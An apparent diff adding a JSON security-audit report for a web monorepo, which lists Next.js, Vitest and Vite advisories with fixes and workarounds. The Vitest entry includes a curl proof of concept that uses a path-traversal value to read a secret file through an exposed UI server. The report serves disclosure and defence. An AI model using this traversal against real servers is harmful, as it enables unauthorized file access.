+      "github_advisory_id": "GHSA-qx2v-qp2m-jg93",
+      "recommendation": "Upgrade to version 8.5.10 or later",
+      "patched_versions": ">=8.5.10",
+      "updated": "2026-04-24T15:31:44.000Z",
+      "cvss": {
+        "score": 6.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-qx2v-qp2m-jg93"
+    },
+    "1117931": {
+      "findings": [
+        {
+          "version": "15.0.3",
+          "paths": [
+            "apps\\web > @hawza/core@link:../../packages/core > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "apps\\web > next@15.0.3",
+            "apps\\web > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "packages\\core > next-auth@5.0.0-beta.25 > next@15.0.3"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/facebook/react/security/advisories/GHSA-rv78-f8rc-xrxh\n- https://github.com/vercel/next.js/security/advisories/GHSA-8h8q-6873-q5fj\n- https://github.com/vitejs/vite-plugin-react/security/advisories/GHSA-w94c-4vhp-22gx\n- https://nvd.nist.gov/vuln/detail/CVE-2026-23870\n- https://github.com/advisories/GHSA-8h8q-6873-q5fj",
+      "created": "2026-05-11T14:50:27.000Z",
+      "id": 1117931,
+      "npm_advisory_id": null,
+      "overview": "A vulnerability affects certain React Server Components packages for versions 19.x and frameworks that use the affected packages, including Next.js 13.x, 14.x, 15.x, and 16.x using the App Router. The issue is tracked upstream as [CVE-2026-23870](https://github.com/facebook/react/security/advisories/GHSA-rv78-f8rc-xrxh). \n\nA specially crafted HTTP request can be sent to any App Router Server Function endpoint that, when deserialized, may trigger excessive CPU usage. This can result in denial of service in unpatched environments.",
+      "reported_by": null,
+      "title": "Next.js Vulnerable to Denial of Service with Server Components",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "next",
+      "vulnerable_versions": ">=13.0.0 <15.5.16",
+      "github_advisory_id": "GHSA-8h8q-6873-q5fj",
+      "recommendation": "Upgrade to version 15.5.16 or later",
+      "patched_versions": ">=15.5.16",
+      "updated": "2026-05-11T14:50:28.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-8h8q-6873-q5fj"
+    },
+    "1118942": {
+      "findings": [
+        {
+          "version": "15.0.3",
+          "paths": [
+            "apps\\web > @hawza/core@link:../../packages/core > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "apps\\web > next@15.0.3",
+            "apps\\web > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "packages\\core > next-auth@5.0.0-beta.25 > next@15.0.3"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-3g8h-86w9-wvmq\n- https://github.com/vercel/next.js/releases/tag/v15.5.16\n- https://github.com/vercel/next.js/releases/tag/v16.2.5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-44572\n- https://github.com/advisories/GHSA-3g8h-86w9-wvmq",
+      "created": "2026-05-11T16:12:07.000Z",
+      "id": 1118942,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nNext.js uses the `x-nextjs-data` request header for internal data requests. On affected versions, an external client could send this header on a normal request to a path handled by middleware that returns a redirect.\n\nWhen that happened, the middleware/proxy could treat the request as a data request and replace the standard `Location` redirect header with the internal `x-nextjs-redirect` header. Browsers do not follow `x-nextjs-redirect`, so the response became an unusable redirect for normal clients.\n\nIf the application was deployed behind a CDN or reverse proxy that caches 3xx responses without varying on this header, a single attacker request could poison the cached redirect response for the affected path. Subsequent visitors could then receive a cached redirect response without a `Location` header, causing a denial of service for that redirect path until the cache entry expired or was purged.\n\n### Affected scenarios\n\nThis affects applications that:\n- use middleware or proxy redirects\n- are deployed behind a caching CDN or reverse proxy\n- allow 3xx responses on those paths to be cached without differentiating internal data requests from normal requests\n\n### Fix\n\nThe fix stops trusting `x-nextjs-data` by itself for middleware redirect handling. A request is now treated as an internal data request only when it is validated as such by internal routing state, preserving legitimate data-request redirect behavior while preventing external header injection from changing normal redirect responses.\n\n### Workarounds\n\nBefore upgrading, users can reduce risk by:\n- configuring the CDN or reverse proxy to vary its cache key on `x-nextjs-data` for affected responses",
+      "reported_by": null,
+      "title": "Next.js's Middleware / Proxy redirects can be cache-poisoned",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-44572"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "next",
+      "vulnerable_versions": ">=12.2.0 <15.5.16",
+      "github_advisory_id": "GHSA-3g8h-86w9-wvmq",
+      "recommendation": "Upgrade to version 15.5.16 or later",
+      "patched_versions": ">=15.5.16",
+      "updated": "2026-05-14T20:35:59.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-349"
+      ],
+      "url": "https://github.com/advisories/GHSA-3g8h-86w9-wvmq"
+    },
+    "1118944": {
+      "findings": [
+        {
+          "version": "15.0.3",
+          "paths": [
+            "apps\\web > @hawza/core@link:../../packages/core > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "apps\\web > next@15.0.3",
+            "apps\\web > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "packages\\core > next-auth@5.0.0-beta.25 > next@15.0.3"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-ffhc-5mcf-pf4q\n- https://github.com/vercel/next.js/releases/tag/v15.5.16\n- https://github.com/vercel/next.js/releases/tag/v16.2.5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-44581\n- https://github.com/advisories/GHSA-ffhc-5mcf-pf4q",
+      "created": "2026-05-11T15:57:12.000Z",
+      "id": 1118944,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nApp Router applications that rely on CSP nonces can be vulnerable to stored cross-site scripting when deployed behind shared caches. In affected versions, malformed nonce values derived from request headers could be reflected into rendered HTML in an unsafe way, allowing an attacker to poison cached responses and cause script execution for later visitors.\n\n### Fix\n\nWe now reject or ignore malformed nonce values before they are embedded into HTML and apply stricter nonce sanitization so request-derived nonce data cannot break out of the intended attribute context.\n\n### Workarounds\n\nIf you cannot upgrade immediately, strip inbound `Content-Security-Policy` request headers from untrusted traffic.",
+      "reported_by": null,
+      "title": "Next.js vulnerable to cross-site scripting in App Router applications using CSP nonces",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-44581"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=13.4.0 <15.5.16",
+      "github_advisory_id": "GHSA-ffhc-5mcf-pf4q",
+      "recommendation": "Upgrade to version 15.5.16 or later",
+      "patched_versions": ">=15.5.16",
+      "updated": "2026-05-14T20:38:59.000Z",
+      "cvss": {
+        "score": 4.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-ffhc-5mcf-pf4q"
+    },
+    "1118946": {
+      "findings": [
+        {
+          "version": "15.0.3",
+          "paths": [
+            "apps\\web > @hawza/core@link:../../packages/core > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "apps\\web > next@15.0.3",
+            "apps\\web > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "packages\\core > next-auth@5.0.0-beta.25 > next@15.0.3"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-vfv6-92ff-j949\n- https://github.com/vercel/next.js/releases/tag/v15.5.16\n- https://github.com/vercel/next.js/releases/tag/v16.2.5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-44582\n- https://github.com/advisories/GHSA-vfv6-92ff-j949",
+      "created": "2026-05-11T15:56:48.000Z",
+      "id": 1118946,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nReact Server Component responses can be vulnerable to cache poisoning in deployments that rely on shared caches with insufficient response partitioning. In affected conditions, collisions in the `_rsc` cache-busting value can allow an attacker to poison cache entries so users receive the wrong response variant for a given URL.\n\n### Fix\n\nWe strengthened the `_rsc` cache-busting mechanism to make practical collisions significantly harder and to better separate response variants that should not share cache entries.\n\n### Workarounds\n\nIf you cannot upgrade immediately, ensure intermediary caches correctly honor `Vary` for RSC-related request headers, or disable shared caching for affected RSC responses until you can deploy a patched release.",
+      "reported_by": null,
+      "title": "Next.js vulnerable to cache poisoning via collisions in React Server Component cache-busting",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-44582"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "next",
+      "vulnerable_versions": ">=13.4.6 <15.5.16",
+      "github_advisory_id": "GHSA-vfv6-92ff-j949",
+      "recommendation": "Upgrade to version 15.5.16 or later",
+      "patched_versions": ">=15.5.16",
+      "updated": "2026-05-14T20:38:34.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-328"
+      ],
+      "url": "https://github.com/advisories/GHSA-vfv6-92ff-j949"
+    },
+    "1118948": {
+      "findings": [
+        {
+          "version": "15.0.3",
+          "paths": [
+            "apps\\web > @hawza/core@link:../../packages/core > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "apps\\web > next@15.0.3",
+            "apps\\web > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "packages\\core > next-auth@5.0.0-beta.25 > next@15.0.3"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-gx5p-jg67-6x7h\n- https://github.com/vercel/next.js/releases/tag/v15.5.16\n- https://github.com/vercel/next.js/releases/tag/v16.2.5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-44580\n- https://github.com/advisories/GHSA-gx5p-jg67-6x7h",
+      "created": "2026-05-11T15:56:38.000Z",
+      "id": 1118948,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nApplications that use `beforeInteractive` scripts together with untrusted content can be vulnerable to cross-site scripting. In affected versions, serialized script content was not escaped safely before being embedded into the document, which could allow attacker-controlled input to break out of the intended script context and execute arbitrary JavaScript in a visitor's browser.\n\n### Fix\n\nWe now HTML-escape serialized `beforeInteractive` script content before embedding it into the page, preventing attacker-controlled content from breaking out of the inline script boundary.\n\n### Workarounds\n\nIf you cannot upgrade immediately, do not pass untrusted data into `beforeInteractive` scripts. If that pattern is unavoidable, sanitize or escape the content before embedding it.",
+      "reported_by": null,
+      "title": "Next.js has cross-site scripting in beforeInteractive scripts with untrusted input",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-44580"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=13.0.0 <15.5.16",
+      "github_advisory_id": "GHSA-gx5p-jg67-6x7h",
+      "recommendation": "Upgrade to version 15.5.16 or later",
+      "patched_versions": ">=15.5.16",
+      "updated": "2026-05-14T20:38:30.000Z",
+      "cvss": {
+        "score": 6.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-gx5p-jg67-6x7h"
+    },
+    "1118950": {
+      "findings": [
+        {
+          "version": "15.0.3",
+          "paths": [
+            "apps\\web > @hawza/core@link:../../packages/core > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "apps\\web > next@15.0.3",
+            "apps\\web > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "packages\\core > next-auth@5.0.0-beta.25 > next@15.0.3"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-mg66-mrh9-m8jx\n- https://github.com/vercel/next.js/releases/tag/v15.5.16\n- https://github.com/vercel/next.js/releases/tag/v16.2.5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-44579\n- https://github.com/advisories/GHSA-mg66-mrh9-m8jx",
+      "created": "2026-05-11T15:56:24.000Z",
+      "id": 1118950,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nApplications using Partial Prerendering through the Cache Components feature can be vulnerable to connection exhaustion through crafted POST requests to a server action. In affected configurations, a malicious request can trigger a request-body handling deadlock that leaves connections open for an extended period, consuming file descriptors and server capacity until legitimate users are denied service.\n\n### Fix\n\nWe now treat the header used for resuming Partial Prerendered requests as an internal-only header and strip it from untrusted incoming requests. This header should never be accepted directly from external clients.\n\n### Workarounds\n\nIf you cannot upgrade immediately, block requests that would be handled by Next.js if they contain the `Next-Resume` header at the edge.",
+      "reported_by": null,
+      "title": "Next.js vulnerable to Denial of Service via connection exhaustion in applications using Cache Components",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-44579"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "next",
+      "vulnerable_versions": ">=15.0.0 <15.5.16",
+      "github_advisory_id": "GHSA-mg66-mrh9-m8jx",
+      "recommendation": "Upgrade to version 15.5.16 or later",
+      "patched_versions": ">=15.5.16",
+      "updated": "2026-05-14T20:38:24.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-mg66-mrh9-m8jx"
+    },
+    "1118952": {
+      "findings": [
+        {
+          "version": "15.0.3",
+          "paths": [
+            "apps\\web > @hawza/core@link:../../packages/core > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "apps\\web > next@15.0.3",
+            "apps\\web > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "packages\\core > next-auth@5.0.0-beta.25 > next@15.0.3"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-h64f-5h5j-jqjh\n- https://github.com/vercel/next.js/releases/tag/v15.5.16\n- https://github.com/vercel/next.js/releases/tag/v16.2.5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-44577\n- https://github.com/advisories/GHSA-h64f-5h5j-jqjh",
+      "created": "2026-05-11T15:56:05.000Z",
+      "id": 1118952,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nWhen self-hosting Next.js with the default image loader, the Image Optimization API fetches local images entirely into memory without enforcing a maximum size limit. An attacker could cause out-of-memory conditions by requesting large local assets from the `/_next/image` endpoint that match the `images.localPatterns` configuration (by default, all patterns are allowed).\n\n- If you are using `images.localPatterns`, only the patterns in that array are impacted.\n- If you are using `images.unoptimized: true`, you are NOT impacted.\n- If you are using `images.loader: 'custom'`, you are NOT impacted.\n- If you are using Vercel, you are NOT impacted.\n\n### Fix\n\nWe now apply response size limits consistently to internal image fetches, not just external ones, and fail oversized responses before they can exhaust process memory.\n\nThis can be adjusted using the `images.maximumResponseBody` configuration.\n\n### Workarounds\n\nIf you cannot upgrade immediately, avoid routing large local assets through `/_next/image`, disable image optimization for large or untrusted local files, or block image optimization access to those assets at the edge.\n\nYou can disable using the `images.localPatterns: []` configuration. This will still allow fetching remote images (which is not impacted).",
+      "reported_by": null,
+      "title": "Next.js has a Denial of Service in the Image Optimization API",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-44577"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=10.0.0 <15.5.16",
+      "github_advisory_id": "GHSA-h64f-5h5j-jqjh",
+      "recommendation": "Upgrade to version 15.5.16 or later",
+      "patched_versions": ">=15.5.16",
+      "updated": "2026-05-14T20:38:19.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-h64f-5h5j-jqjh"
+    },
+    "1118954": {
+      "findings": [
+        {
+          "version": "15.0.3",
+          "paths": [
+            "apps\\web > @hawza/core@link:../../packages/core > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "apps\\web > next@15.0.3",
+            "apps\\web > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "packages\\core > next-auth@5.0.0-beta.25 > next@15.0.3"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-c4j6-fc7j-m34r\n- https://github.com/vercel/next.js/releases/tag/v15.5.16\n- https://github.com/vercel/next.js/releases/tag/v16.2.5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-44578\n- https://github.com/advisories/GHSA-c4j6-fc7j-m34r",
+      "created": "2026-05-11T15:55:15.000Z",
+      "id": 1118954,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nSelf-hosted applications using the built-in Node.js server can be vulnerable to server-side request forgery through crafted WebSocket upgrade requests. An attacker can cause the server to proxy requests to arbitrary internal or external destinations, which may expose internal services or cloud metadata endpoints. Vercel-hosted deployments are not affected.\n\n### Fix\n\nWe now apply the same safety checks to WebSocket upgrade handling that already existed for normal HTTP requests, so upgrade requests are only proxied when routing has explicitly marked them as safe external rewrites.\n\n### Workarounds\n\nIf you cannot upgrade immediately, do not expose the origin server directly to untrusted networks. If WebSocket upgrades are not required, block them at your reverse proxy or load balancer, and restrict origin egress to internal networks and metadata services where possible.",
+      "reported_by": null,
+      "title": "Next.js vulnerable to server-side request forgery in applications using WebSocket upgrades",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-44578"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "next",
+      "vulnerable_versions": ">=13.4.13 <15.5.16",
+      "github_advisory_id": "GHSA-c4j6-fc7j-m34r",
+      "recommendation": "Upgrade to version 15.5.16 or later",
+      "patched_versions": ">=15.5.16",
+      "updated": "2026-05-14T20:38:24.000Z",
+      "cvss": {
+        "score": 8.6,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-918"
+      ],
+      "url": "https://github.com/advisories/GHSA-c4j6-fc7j-m34r"
+    },
+    "1118958": {
+      "findings": [
+        {
+          "version": "15.0.3",
+          "paths": [
+            "apps\\web > @hawza/core@link:../../packages/core > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "apps\\web > next@15.0.3",
+            "apps\\web > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "packages\\core > next-auth@5.0.0-beta.25 > next@15.0.3"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-wfc6-r584-vfw7\n- https://github.com/vercel/next.js/releases/tag/v15.5.16\n- https://github.com/vercel/next.js/releases/tag/v16.2.5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-44576\n- https://github.com/advisories/GHSA-wfc6-r584-vfw7",
+      "created": "2026-05-11T15:54:46.000Z",
+      "id": 1118958,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nApplications using React Server Components can be vulnerable to cache poisoning when shared caches do not correctly partition response variants. Under affected conditions, an attacker can cause an RSC response to be served from the original URL and poison shared cache entries so later visitors receive component payloads instead of the expected HTML.\n\n### Fix\n\nWe now validate and interpret `RSC` request headers consistently across request classification and rendering, and we enforce the intended cache-busting behavior so RSC payloads are not unexpectedly served from the original URL.\n\n### Workarounds\n\nIf you cannot upgrade immediately, ensure your CDN or reverse proxy keys on the relevant RSC request headers and honors `Vary`, or disable shared caching for affected App Router and RSC responses.",
+      "reported_by": null,
+      "title": "Next.js vulnerable to cache poisoning in React Server Component responses",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-44576"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=14.2.0 <15.5.16",
+      "github_advisory_id": "GHSA-wfc6-r584-vfw7",
+      "recommendation": "Upgrade to version 15.5.16 or later",
+      "patched_versions": ">=15.5.16",
+      "updated": "2026-05-14T20:38:14.000Z",
+      "cvss": {
+        "score": 5.4,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:N/I:L/A:L"
+      },
+      "cwe": [
+        "CWE-436"
+      ],
+      "url": "https://github.com/advisories/GHSA-wfc6-r584-vfw7"
+    },
+    "1118962": {
+      "findings": [
+        {
+          "version": "15.0.3",
+          "paths": [
+            "apps\\web > @hawza/core@link:../../packages/core > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "apps\\web > next@15.0.3",
+            "apps\\web > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "packages\\core > next-auth@5.0.0-beta.25 > next@15.0.3"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-36qx-fr4f-26g5\n- https://github.com/vercel/next.js/releases/tag/v15.5.16\n- https://github.com/vercel/next.js/releases/tag/v16.2.5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-44573\n- https://github.com/advisories/GHSA-36qx-fr4f-26g5",
+      "created": "2026-05-11T15:53:51.000Z",
+      "id": 1118962,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nApplications using the Pages Router with `i18n` configured and middleware/proxy-based authorization can allow unauthorized access to protected page data through locale-less `/_next/data/<buildId>/<page>.json` requests. In affected configurations, middleware does not run for the unprefixed data route, allowing an attacker to retrieve SSR JSON for protected pages without passing the intended authorization checks.\n\n### Fix\nThe matcher logic was updated to perform the same match as it would on a non-i18n data route.\n\n### Workarounds\n\nIf you cannot upgrade immediately, enforce authorization in the page's server-side data path instead of relying solely on middleware.",
+      "reported_by": null,
+      "title": "Next.js has a Middleware / Proxy bypass in Pages Router applications using i18n",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-44573"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "next",
+      "vulnerable_versions": ">=12.2.0 <15.5.16",
+      "github_advisory_id": "GHSA-36qx-fr4f-26g5",
+      "recommendation": "Upgrade to version 15.5.16 or later",
+      "patched_versions": ">=15.5.16",
+      "updated": "2026-05-14T20:38:00.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-863"
+      ],
+      "url": "https://github.com/advisories/GHSA-36qx-fr4f-26g5"
+    },
+    "1120126": {
+      "findings": [
+        {
+          "version": "2.1.9",
+          "paths": [
+            "apps\\web > vitest@2.1.9",
+            "packages\\core > vitest@2.1.9",
+            "packages\\plugins\\plugin-auth > vitest@2.1.9",
+            "packages\\plugins\\plugin-catalog > vitest@2.1.9",
+            "packages\\plugins\\plugin-credentials > vitest@2.1.9",
+            "packages\\plugins\\plugin-learning > vitest@2.1.9",
+            "packages\\plugins\\plugin-localization > vitest@2.1.9"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitest-dev/vitest/security/advisories/GHSA-5xrq-8626-4rwp\n- https://github.com/vitest-dev/vitest/blob/eb1abf08573032a532015b999ad3501c5e89e3bb/packages/browser/src/node/commands/fs.ts#L10-L11\n- https://github.com/vitest-dev/vitest/blob/eb1abf08573032a532015b999ad3501c5e89e3bb/packages/browser/src/node/plugin.ts#L194-L196\n- https://github.com/vitest-dev/vitest/blob/eb1abf08573032a532015b999ad3501c5e89e3bb/packages/browser/src/node/rpc.ts#L115-L121\n- https://github.com/vitest-dev/vitest/blob/eb1abf08573032a532015b999ad3501c5e89e3bb/packages/ui/node/index.ts#L77\n- https://github.com/vitest-dev/vitest/blob/eb1abf08573032a532015b999ad3501c5e89e3bb/packages/vitest/src/api/setup.ts#L103-L105\n- https://github.com/vitest-dev/vitest/blob/eb1abf08573032a532015b999ad3501c5e89e3bb/packages/vitest/src/api/setup.ts#L119-L121\n- https://github.com/advisories/GHSA-5xrq-8626-4rwp",
+      "created": "2026-06-01T14:09:53.000Z",
+      "id": 1120126,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nArbitrary file can be read on Windows when Vitest UI server is listening, especially when exposed to the network.\n\n### Impact\nOnly users that match either of the following conditions are affected:\n\n- explicitly exposes the Vitest UI server to the network (using `--api.host` or [`api.host` config option](https://vitest.dev/config/api.html))\n- running the Vitest UI or Browser Mode on Windows\n\n### Details\nThe API handler for `/__vitest_attachment__` uses the deprecated `isFileServingAllowed` incorrectly.\nhttps://github.com/vitest-dev/vitest/blob/eb1abf08573032a532015b999ad3501c5e89e3bb/packages/ui/node/index.ts#L77\nThe function expects the passed value to use `cleanUrl` after the check before file system related operation.\nBecause of this, it is possible to bypass the check by `\\\\?\\\\..\\\\`. This is not possible on Linux as Linux errors if a directory named `?` does not exist.\n\nA similar problem exists in other places as well.\n- https://github.com/vitest-dev/vitest/blob/eb1abf08573032a532015b999ad3501c5e89e3bb/packages/vitest/src/api/setup.ts#L103-L105\n- https://github.com/vitest-dev/vitest/blob/eb1abf08573032a532015b999ad3501c5e89e3bb/packages/vitest/src/api/setup.ts#L119-L121\n- https://github.com/vitest-dev/vitest/blob/eb1abf08573032a532015b999ad3501c5e89e3bb/packages/browser/src/node/commands/fs.ts#L10-L11\n- https://github.com/vitest-dev/vitest/blob/eb1abf08573032a532015b999ad3501c5e89e3bb/packages/browser/src/node/plugin.ts#L194-L196\n- https://github.com/vitest-dev/vitest/blob/eb1abf08573032a532015b999ad3501c5e89e3bb/packages/browser/src/node/rpc.ts#L115-L121\n\n**That said**, this `isFileServingAllowed` check does not actually prevent the API to be abused. Since the API has rerun feature and file write feature, it's possible to run arbitrary script by writing a script as a test file using `saveTestFile` and running it using `rerun`. This means exposing the API / Vitest UI is equivalent to giving script execution access.\nOn the browser mode side, there're `readFile` / `writeFile` / `saveSnapshotFile`. So exposing the browser mode is equivalent to giving file read / write access.\n\n### PoC\n1. Run Vitest UI\n2. Get the API token by `curl http://localhost:51204/__vitest__/`\n3. Run `curl \"http://localhost:51204/__vitest_attachment__?path=C:\\\\path\\\\to\\\\project\\\\?\\\\..\\\\..\\\\secret.txt&amp;contentType=text/plain&amp;token=$TOKEN\"` (TOKEN is the API token)\n4. curl shows the content of `secret.txt` that is outside the project directory\n\n### Mitigations\n\nVitest now ships two configuration flags, [`allowWrite`](https://vitest.dev/config/api.html#api-allowwrite) and [`allowExec`](https://vitest.dev/config/api.html#api-allowexec), that gate the privileged operations exploited by this vulnerability. Both are disabled by default whenever the API server is bound to a non-`localhost` host, ensuring that exposing the server to the network no longer implicitly grants write or execute capabilities to remote clients.\n\nWhen these flags are disabled, the UI also enters a read-only mode: in-browser code editing and test file execution are turned off, removing the attack surface that allowed remote code execution. Many Browser Mode features are also disabled, like attachments, artifacts or snapshots. See [`browser.api`](https://vitest.dev/config/browser/api.html#api-allowwrite).\n\nUsers who require the full interactive UI on a networked host must explicitly opt in by setting `allowWrite` and/or `allowExec` to `true`.",
+      "reported_by": null,
+      "title": "When Vitest UI server is listening, arbitrary file can be read and executed",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-47429"
+      ],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "vitest",
+      "vulnerable_versions": "<3.2.6",
+      "github_advisory_id": "GHSA-5xrq-8626-4rwp",
+      "recommendation": "Upgrade to version 3.2.6 or later",
+      "patched_versions": ">=3.2.6",
+      "updated": "2026-06-08T16:11:59.000Z",
+      "cvss": {
+        "score": 9.8,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-862"
+      ],
+      "url": "https://github.com/advisories/GHSA-5xrq-8626-4rwp"
+    },
+    "1120784": {
+      "findings": [
+        {
+          "version": "5.4.21",
+          "paths": [
+            "apps\\web > vitest@2.1.9 > @vitest/mocker@2.1.9 > vite@5.4.21",
+            "apps\\web > vitest@2.1.9 > vite@5.4.21",
+            "apps\\web > vitest@2.1.9 > vite-node@2.1.9 > vite@5.4.21",
+            "packages\\core > vitest@2.1.9 > @vitest/mocker@2.1.9 > vite@5.4.21",
+            "packages\\core > vitest@2.1.9 > vite@5.4.21",
+            "packages\\core > vitest@2.1.9 > vite-node@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-auth > vitest@2.1.9 > @vitest/mocker@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-auth > vitest@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-auth > vitest@2.1.9 > vite-node@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-catalog > vitest@2.1.9 > @vitest/mocker@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-catalog > vitest@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-catalog > vitest@2.1.9 > vite-node@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-credentials > vitest@2.1.9 > @vitest/mocker@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-credentials > vitest@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-credentials > vitest@2.1.9 > vite-node@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-learning > vitest@2.1.9 > @vitest/mocker@2.1.9 > vite@5.4.21",
